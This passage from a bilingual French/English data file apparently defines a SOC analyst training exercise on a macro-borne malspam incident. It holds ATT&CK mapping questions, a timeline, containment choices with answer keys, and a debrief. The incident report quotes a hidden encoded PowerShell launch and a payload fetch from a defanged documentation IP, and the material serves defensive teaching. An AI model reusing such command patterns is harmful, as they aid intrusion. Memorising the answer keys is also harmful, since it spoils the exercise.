            fr: 'Sysmon EID 13 : HKCU\\…\\Run\\OneDriveSetup → %APPDATA%\\Micro\\svhost.exe.',
            en: 'Sysmon EID 13: HKCU\\…\\Run\\OneDriveSetup → %APPDATA%\\Micro\\svhost.exe.',
          },
        },
        {
          id: 'T1071.001',
          name: { fr: 'Protocole applicatif : protocoles web', en: 'Application Layer Protocol: Web Protocols' },
          tactic: 'command-and-control',
          url: 'https://attack.mitre.org/techniques/T1071/001/',
          observed: true,
          evidence: {
            fr: 'POST /gate.php toutes les ~300 s depuis nsjKq.exe.',
            en: 'POST /gate.php roughly every 300 s from nsjKq.exe.',
          },
        },
        {
          id: 'T1003.001',
          name: { fr: "Vidage d'identifiants : mémoire LSASS", en: 'OS Credential Dumping: LSASS Memory' },
          tactic: 'credential-access',
          url: 'https://attack.mitre.org/techniques/T1003/001/',
          observed: false,
        },
        {
          id: 'T1486',
          name: { fr: 'Chiffrement de données pour impact', en: 'Data Encrypted for Impact' },
          tactic: 'impact',
          url: 'https://attack.mitre.org/techniques/T1486/',
          observed: false,
        },
        {
          id: 'T1021.001',
          name: { fr: 'Services distants : RDP', en: 'Remote Services: Remote Desktop Protocol' },
          tactic: 'lateral-movement',
          url: 'https://attack.mitre.org/techniques/T1021/001/',
          observed: false,
        },
      ],
      question: {
        id: 'l1-q-mitre',
        points: 15,
        multi: true,
        prompt: {
          fr: 'Quelles techniques sont réellement étayées par vos journaux ?',
          en: 'Which techniques are actually supported by your logs?',
        },
        hint: {
          fr: 'Trois propositions décrivent des comportements que vous n’avez observés nulle part.',
          en: 'Three options describe behaviour you have observed nowhere.',
        },
        options: [
          { id: 'T1566.001', label: { fr: 'T1566.001 — Pièce jointe malveillante', en: 'T1566.001 — Spearphishing Attachment' } },
          { id: 'T1204.002', label: { fr: 'T1204.002 — Exécution par l’utilisateur', en: 'T1204.002 — User Execution' } },
          { id: 'T1059.001', label: { fr: 'T1059.001 — PowerShell', en: 'T1059.001 — PowerShell' } },
          { id: 'T1105', label: { fr: 'T1105 — Transfert d’outil entrant', en: 'T1105 — Ingress Tool Transfer' } },
          { id: 'T1547.001', label: { fr: 'T1547.001 — Clés Run', en: 'T1547.001 — Registry Run Keys' } },
          { id: 'T1071.001', label: { fr: 'T1071.001 — C2 sur protocoles web', en: 'T1071.001 — Web Protocols C2' } },
          {
            id: 'T1003.001',
            label: { fr: 'T1003.001 — Dump LSASS', en: 'T1003.001 — LSASS dumping' },
            feedback: {
              fr: "Aucun accès à lsass.exe dans les journaux Sysmon (EID 10 absent). Emotet peut mener à du vol d'identifiants, mais ici rien ne le prouve.",
              en: 'No lsass.exe access in the Sysmon logs (no EID 10). Emotet can lead to credential theft, but nothing here proves it.',
            },
          },
          {
            id: 'T1486',
            label: { fr: 'T1486 — Chiffrement pour impact', en: 'T1486 — Data Encrypted for Impact' },
            feedback: {
              fr: "Aucune extension modifiée, aucune note de rançon, aucun pic d'écriture disque. Mapper un ransomware ici serait une invention.",
              en: 'No renamed extensions, no ransom note, no disk write spike. Mapping ransomware here would be fiction.',
            },
          },
          {
            id: 'T1021.001',
            label: { fr: 'T1021.001 — RDP', en: 'T1021.001 — RDP' },
            feedback: {
              fr: 'Aucun 4624 de type 10 ni connexion 3389 dans la fenêtre analysée.',
              en: 'No type 10 logon and no 3389 connection in the analysed window.',
            },
          },
        ],
        correct: ['T1566.001', 'T1204.002', 'T1059.001', 'T1105', 'T1547.001', 'T1071.001'],
        explanation: {
          fr: "Le mapping n'est pas un exercice de culture générale : chaque technique cochée doit pouvoir être défendue avec un identifiant d'événement et un horodatage. Les trois techniques absentes sont typiques des étapes suivantes d'une intrusion Emotet réelle — mais « ça arrive souvent après » n'est pas une preuve. C'est cette discipline qui rend un rapport utilisable par l'équipe de détection.",
          en: 'Mapping is not a general-knowledge quiz: every ticked technique must be defensible with an event ID and a timestamp. The three absent techniques are typical of the later stages of a real Emotet intrusion — but "it often happens next" is not evidence. That discipline is what makes a report usable by the detection team.',
        },
      },
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'timeline',
      id: 'l1-timeline',
      title: { fr: 'Reconstruction', en: 'Reconstruction' },
      points: 15,
      intro: {
        fr: "Remettez la chaîne dans l'ordre. Un rapport d'incident se lit toujours comme une chronologie : c'est ce qui permet de dire où la détection aurait dû tomber plus tôt.",
        en: 'Put the chain back in order. An incident report always reads as a timeline: that is what lets you say where detection should have fired earlier.',
      },
      events: [
        {
          id: 'l1-t1',
          time: '08:31',
          label: { fr: 'Livraison du mail piégé', en: 'Weaponised email delivered' },
          detail: { fr: 'DMARC fail, politique p=none, livré quand même.', en: 'DMARC fail, p=none policy, delivered anyway.' },
        },
        {
          id: 'l1-t2',
          time: '08:39',
          label: { fr: 'Ouverture de la pièce jointe et activation des macros', en: 'Attachment opened, macros enabled' },
        },
        {
          id: 'l1-t3',
          time: '08:40',
          label: { fr: 'WINWORD lance PowerShell encodé', en: 'WINWORD spawns encoded PowerShell' },
        },
        {
          id: 'l1-t4',
          time: '08:40',
          label: { fr: 'Téléchargement de la charge utile (200, 412 Ko)', en: 'Payload downloaded (200, 412 KB)' },
        },
        {
          id: 'l1-t5',
          time: '08:41',
          label: { fr: 'Exécution du binaire non signé depuis %TEMP%', en: 'Unsigned binary executed from %TEMP%' },
        },
        {
          id: 'l1-t6',
          time: '08:41',
          label: { fr: 'Création de la persistance (clé Run)', en: 'Persistence created (Run key)' },
        },
        {
          id: 'l1-t7',
          time: '08:43',
          label: { fr: 'Première balise vers le C2', en: 'First beacon to the C2' },
        },
        {
          id: 'l1-t8',
          time: '08:44',
          label: { fr: 'Mise en quarantaine par Defender', en: 'Defender quarantines the file' },
        },
        {
          id: 'l1-t9',
          time: '08:47',
          label: { fr: "Génération de l'alerte SIEM et prise en charge L1", en: 'SIEM alert raised and picked up by Tier 1' },
        },
      ],
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'decision',
      id: 'l1-decision',
      title: { fr: 'Endiguement', en: 'Containment' },
      intro: {
        fr: "Vous avez dix minutes avant le point de 9 h. Décidez de vos actions et assumez-les : chaque case cochée a un coût opérationnel, chaque case oubliée a un coût en risque.",
        en: 'You have ten minutes before the 09:00 stand-up. Decide your actions and own them: every box you tick has an operational cost, every box you miss has a risk cost.',
      },
      questions: [
        {
          id: 'l1-q-contain',
          points: 15,
          multi: true,
          prompt: {
            fr: 'Quelles actions engagez-vous maintenant ?',
            en: 'Which actions do you take right now?',
          },
          options: [
            {
              id: 'isolate',
              label: {
                fr: 'Isoler PC-1188 et PC-1204 via l’EDR (isolation réseau, pas extinction)',
                en: 'Isolate PC-1188 and PC-1204 through the EDR (network isolation, not shutdown)',
              },
            },
            {
              id: 'block-ioc',
              label: {
                fr: 'Bloquer 203.0.113.42 et l’URL du C2 sur le proxy, et purger le mail des 12 boîtes livrées',
                en: 'Block 203.0.113.42 and the C2 URL on the proxy, and purge the email from the 12 delivered mailboxes',
              },
            },
            {
              id: 'reset-creds',
              label: {
                fr: 'Réinitialiser les mots de passe des utilisateurs touchés et révoquer leurs sessions M365',
                en: 'Reset the affected users’ passwords and revoke their M365 sessions',
              },
            },
            {
              id: 'power-off',
              label: {
                fr: 'Éteindre les postes pour couper immédiatement le C2',
                en: 'Power the machines off to cut the C2 immediately',
              },
              feedback: {
                fr: "L'extinction coupe le C2 mais détruit la mémoire vive, les processus en cours et les connexions actives. L'isolation EDR coupe le réseau en gardant la machine vivante pour la collecte.",
                en: 'Powering off cuts the C2 but destroys memory, running processes and live connections. EDR isolation cuts the network while keeping the machine alive for collection.',
              },
            },
            {
              id: 'close-av',
              label: {
                fr: 'Clore l’incident : la quarantaine Defender a fait le travail',
                en: 'Close the incident: the Defender quarantine did the job',
              },
              feedback: {
                fr: 'La clé Run et la seconde copie du binaire sont toujours sur le disque. La machine se réinfecte à la prochaine ouverture de session.',
                en: 'The Run key and the second copy of the binary are still on disk. The machine re-infects itself at the next logon.',
              },
            },
            {
              id: 'delete-evidence',
              label: {
                fr: 'Supprimer définitivement le mail de toutes les boîtes sans en conserver de copie',
                en: 'Hard-delete the email from every mailbox without keeping a copy',
              },
              feedback: {
                fr: "Purger, oui — mais on conserve toujours un exemplaire en zone d'analyse : en-têtes, pièce jointe et hash servent à la détection, au signalement et, si besoin, à la procédure judiciaire.",
                en: 'Purge, yes — but always keep one copy in an analysis area: headers, attachment and hash feed detection, reporting and, if needed, legal proceedings.',
              },
            },
          ],
          correct: ['isolate', 'block-ioc', 'reset-creds'],
          explanation: {
            fr: "L'endiguement suit toujours le même triptyque : couper la communication (isolation et blocage des IOC), couper la réutilisation (identifiants et sessions), préserver la preuve (isoler plutôt qu'éteindre, conserver le mail). Les trois pièges de cette question correspondent aux trois façons les plus courantes de transformer un incident maîtrisé en incident non analysable.",
            en: 'Containment always follows the same triptych: cut the communication (isolation and IOC blocking), cut the reuse (credentials and sessions), preserve the evidence (isolate rather than power off, keep the email). The three traps in this question are the three most common ways of turning a contained incident into an unanalysable one.',
          },
        },
        {
          id: 'l1-q-escalate',
          points: 8,
          prompt: {
            fr: 'Escaladez-vous en L2, et à quel moment ?',
            en: 'Do you escalate to Tier 2, and when?',
          },
          options: [
            {
              id: 'now',
              label: {
                fr: "Oui, maintenant : exécution confirmée, persistance, C2 actif et plusieurs postes — les critères d'escalade sont réunis.",
                en: 'Yes, now: confirmed execution, persistence, live C2 and several hosts — the escalation criteria are met.',
              },
            },
            {
              id: 'never',
              label: {
                fr: 'Non : un L1 doit savoir clôturer seul un malware de commodité.',
                en: 'No: a Tier 1 should be able to close a commodity malware case alone.',
              },
              feedback: {
                fr: "Le critère n'est pas la « noblesse » du malware mais l'impact : plusieurs hôtes, persistance et C2 actif relèvent du L2, qui a les droits et le temps pour la chasse rétroactive.",
                en: 'The criterion is not how "noble" the malware is but the impact: several hosts, persistence and a live C2 belong to Tier 2, who has the rights and the time for retro-hunting.',
              },
            },
            {
              id: 'ciso',
              label: {
                fr: 'Seulement si le RSSI le demande.',
                en: 'Only if the CISO asks for it.',
              },
              feedback: {
                fr: "L'escalade suit une procédure, pas une hiérarchie d'humeur. Sinon elle dépend de qui est disponible ce jour-là.",
                en: 'Escalation follows a procedure, not a mood hierarchy. Otherwise it depends on who happens to be around that day.',
              },
            },
            {
              id: 'eod',
              label: {
                fr: "En fin de journée, dans le rapport quotidien.",
                en: 'At the end of the day, in the daily report.',
              },
              feedback: {
                fr: "Un C2 actif se compte en minutes. Huit heures de délai, c'est huit heures d'accès offert.",
                en: 'A live C2 is measured in minutes. An eight-hour delay is eight hours of free access.',
              },
            },
          ],
          correct: ['now'],
          explanation: {
            fr: "Les critères d'escalade doivent être écrits et objectifs : exécution de code confirmée, persistance installée, communication sortante active, plus d'un hôte concerné, ou compte privilégié impliqué. Ici, quatre critères sur cinq sont atteints. Escalader n'est pas un aveu de faiblesse : c'est le bon usage du temps de chacun.",
            en: 'Escalation criteria must be written and objective: confirmed code execution, installed persistence, live outbound communication, more than one host involved, or a privileged account in play. Here four of the five are met. Escalating is not an admission of weakness: it is the correct use of everyone’s time.',
          },
        },
      ],
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'debrief',
      id: 'l1-debrief',
      title: { fr: 'Débrief', en: 'Debrief' },
      summary: {
        fr: "Une alerte MEDIUM, traitée correctement, a révélé une campagne de malspam touchant quatorze boîtes et deux postes compromis, avec persistance et canal de commande actif. Le tout en moins de vingt minutes d'investigation, uniquement avec des sources standard : message trace, Sysmon, proxy, EDR.",
        en: 'One MEDIUM alert, worked properly, surfaced a malspam campaign hitting fourteen mailboxes and two compromised hosts, with persistence and a live command channel. All in under twenty minutes of investigation, using only standard sources: message trace, Sysmon, proxy, EDR.',
      },
      facts: [
        { label: { fr: 'Classification', en: 'Classification' }, value: { fr: 'Vrai positif — Malware / accès initial', en: 'True positive — Malware / initial access' } },
        { label: { fr: 'Sévérité retenue', en: 'Final severity' }, value: { fr: 'Élevée (relevée depuis Moyenne)', en: 'High (raised from Medium)' } },
        { label: { fr: 'Vecteur', en: 'Vector' }, value: { fr: 'Pièce jointe .docm à macros, fil de discussion simulé', en: 'Macro-enabled .docm attachment, faked reply thread' } },
        { label: { fr: 'Hôtes compromis', en: 'Compromised hosts' }, value: { fr: 'PC-1188, PC-1204 (PC-0931 bloqué par ASR)', en: 'PC-1188, PC-1204 (PC-0931 blocked by ASR)' } },
        { label: { fr: 'Temps de détection', en: 'Time to detect' }, value: { fr: '16 minutes (08:31 → 08:47)', en: '16 minutes (08:31 → 08:47)' } },
        { label: { fr: 'IOC produits', en: 'IOCs produced' }, value: { fr: '2 hashes, 1 IP, 2 URL, 1 domaine expéditeur, 1 clé de registre', en: '2 hashes, 1 IP, 2 URLs, 1 sender domain, 1 registry key' } },
      ],
      lessons: [
        {
          fr: "La sévérité d'une règle est une priorité de traitement, jamais un verdict. Les campagnes de commodité se cachent très bien dans le MEDIUM.",
          en: 'A rule severity is a processing priority, never a verdict. Commodity campaigns hide very comfortably in the MEDIUM band.',
        },
        {
          fr: "« Quarantaine réussie » ne signifie pas « incident terminé ». Vérifiez toujours ce qui s'est exécuté avant la détection, et ce qui reste après.",
          en: '"Quarantine succeeded" does not mean "incident over". Always check what ran before detection, and what remains after.',
        },
        {
          fr: 'Le périmètre se mesure avant de clore. Une campagne de phishing vise une liste, pas une personne.',
          en: 'Scope is measured before closing. A phishing campaign targets a list, not a person.',
        },
        {
          fr: "Isoler n'est pas éteindre. La machine doit rester vivante pour que la mémoire, les processus et les connexions restent exploitables.",
          en: 'Isolating is not powering off. The machine must stay alive so memory, processes and connections remain usable.',
        },
      ],
      rootCause: [
        { fr: 'Politique DMARC publiée en p=none : les échecs sont constatés puis livrés quand même.', en: 'DMARC policy published as p=none: failures are observed and then delivered anyway.' },
        { fr: 'Macros non bloquées par défaut pour les documents venant d’Internet.', en: 'Macros not blocked by default for documents originating from the internet.' },
        { fr: 'Règle ASR « Office ne crée pas de processus enfant » déployée sur une partie du parc seulement.', en: 'The "Office must not create child processes" ASR rule deployed on only part of the estate.' },
        { fr: 'Aucune corrélation automatique entre message trace et télémétrie poste.', en: 'No automatic correlation between message trace and endpoint telemetry.' },
      ],
      remediation: [
        { fr: 'Passer DMARC en quarantine puis reject, et alerter sur les domaines ressemblants.', en: 'Move DMARC to quarantine then reject, and alert on look-alike domains.' },
        { fr: 'Généraliser les règles ASR, en commençant par le blocage des processus enfants Office.', en: 'Roll out the ASR rules estate-wide, starting with blocking Office child processes.' },
        { fr: 'Activer la journalisation des blocs de script PowerShell (EID 4104) sur tout le parc.', en: 'Enable PowerShell script block logging (EID 4104) across the estate.' },
        { fr: 'Écrire une détection corrélée : Office → interpréteur + requête sortante vers une IP non catégorisée.', en: 'Write a correlated detection: Office → interpreter + outbound request to an uncategorised IP.' },
        { fr: 'Sensibiliser le service comptabilité sur les leurres de type « RE: facture ».', en: 'Brief the finance team on "RE: invoice" style lures.' },
      ],
      report: {
        fr: "INC-2026-0922-01 — Compromission par malspam, service comptabilité.\nVecteur : pièce jointe .docm envoyée depuis nordco-fournisseurs[.]example vers 14 destinataires internes, objet simulant une réponse dans un fil existant. 12 livraisons, 3 ouvertures, 2 exécutions.\nChaîne : WINWORD.EXE → powershell.exe -w hidden -ep bypass -enc → téléchargement de hxxp://203.0.113.42/x/upd.dat vers %TEMP%\\nsjKq.exe → exécution → clé Run HKCU\\…\\OneDriveSetup vers %APPDATA%\\Micro\\svhost.exe → balise HTTP POST /gate.php toutes les 300 s.\nDetection : Defender a mis nsjKq.exe en quarantaine à 08:44, soit après exécution et premier contact C2 ; la persistance et la seconde copie subsistaient.\nEndiguement : isolation EDR de PC-1188 et PC-1204, blocage IP/URL au proxy, purge des messages avec conservation d'un exemplaire, réinitialisation des comptes et révocation des sessions M365.\nEscalade : L2 pour chasse rétroactive sur 30 jours (hash, IP, clé de registre) et vérification des postes sans règle ASR.",
        en: "INC-2026-0922-01 — Malspam compromise, finance department.\nVector: .docm attachment sent from nordco-fournisseurs[.]example to 14 internal recipients, subject faking a reply in an existing thread. 12 delivered, 3 opened, 2 executed.\nChain: WINWORD.EXE → powershell.exe -w hidden -ep bypass -enc → download of hxxp://203.0.113.42/x/upd.dat to %TEMP%\\nsjKq.exe → execution → Run key HKCU\\…\\OneDriveSetup pointing at %APPDATA%\\Micro\\svhost.exe → HTTP POST /gate.php beacon every 300 s.\nDetection: Defender quarantined nsjKq.exe at 08:44, i.e. after execution and first C2 contact; the persistence and the second copy remained.\nContainment: EDR isolation of PC-1188 and PC-1204, IP/URL blocking at the proxy, message purge with one copy retained, account resets and M365 session revocation.\nEscalation: Tier 2 for a 30-day retro-hunt (hash, IP, registry key) and review of endpoints without the ASR rule.",
      },
    },
  ],
};
